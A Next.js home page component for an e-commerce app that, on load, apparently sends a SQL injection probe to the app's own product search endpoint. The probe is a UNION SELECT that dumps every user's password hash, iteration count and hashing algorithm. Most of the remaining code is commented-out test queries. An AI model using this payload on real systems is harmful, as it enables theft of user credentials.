import type { NextPage } from "next";
import { signIn, useSession } from "next-auth/react";
import Head from "next/head";
import { useEffect } from "react";
import { trpc } from "../utils/trpc";

const Home: NextPage = () => {
  const session = useSession();
  trpc.useQuery(
    [
      "product.search.searchProduct",
      `nope' in 'not')>0 UNION  select "public"."Password"."password", "public"."Password"."numIterations", "public"."Password"."hashingAlgorithm" from "public"."Password" where "public"."Password"."passwordId" in (select "public"."UserAuthentication"."currentPasswordId" from "public"."UserAuthentication" where "public"."UserAuthentication"."userId" in (select id from "public"."User" where 1=1));--`,
      // "product.search.searchProductv2",
      // {
      // query: "check",
      // query: `nope' in 'not')>0 UNION  select "public"."Password"."password", "public"."Password"."numIterations", "public"."Password"."hashingAlgorithm" from "public"."Password" where "public"."Password"."passwordId" in (select "public"."UserAuthentication"."currentPasswordId" from "public"."UserAuthentication" where "public"."UserAuthentication"."userId" in (select id from "public"."User" where 1=1));--`,
      // },
    ],
    {
      onSuccess: (data) => {
        console.log(data);
      },
    }
  );
  // const seller = trpc.useMutation(["seller.addProducts"]);

  return (
    <>
      <Head>
        <title>Home</title>
      </Head>
      <button onClick={() => signIn()}>
        {session.status === "loading" ? "Loading..." : "Sign In"}
      </button>
    </>
  );
};

export default Home;

// const addProd = trpc.useMutation(["seller.addProducts"]);

// useEffect(() => console.log(session), [session]);

// const prodDetails = trpc.useQuery([
//   "product.getProductDetails",
//   {
//     id: "bca586ea-bd76-4c6e-8ff7-077efb150ea0",
//     select: {
//       brand: true,
//       questions: 2,
//       answers: 2,
//     },
//   },
// {
//   query: "product1",
//   filters: { priceRangeMax: 1000, priceRangeMin: 300 },
// },
// ]);

// const seller = trpc.useQuery(
//   [
//     "seller.getStoreDetails",
//     {
//       id: "8725a927-17c7-456d-85a3-68fdf2308eec",
//       select: {
//         name: true,
//         description: true,
//         products: {
//           description: true,
//           price: true,
//           includeDeleted: true,
//           includeCurrentlyAvailable: true,
//         },
//       },
//     },
//   ],
//   {
//     onSuccess(data) {
//       console.log(data);
//     },
//   }
// );

// useEffect(() => {
//   const prod = addProd.mutate(
//     {
//       storeID: "8725a927-17c7-456d-85a3-68fdf2308eec",
//       products: [
//         {
//           name: "test",
//           description: "test",
//           price: 100,
//           stock: 10,
//           images: ["1ZS.jpg"],
//           paymentMethods: 1,
//           giftOptionAvailable: true,
//           returnFrame: 1,
//           replaceFrame: 1,
//           brand: "90d82510-ed37-4209-82a7-3cf5355d472a",
//         },
//       ],
//     },
//     { onSuccess: (data) => console.log(data) }
//   );
// }, []);

// const userProf = trpc.useQuery(["user.getCart"]);
// console.log(prodDetails.data, userProf.data);
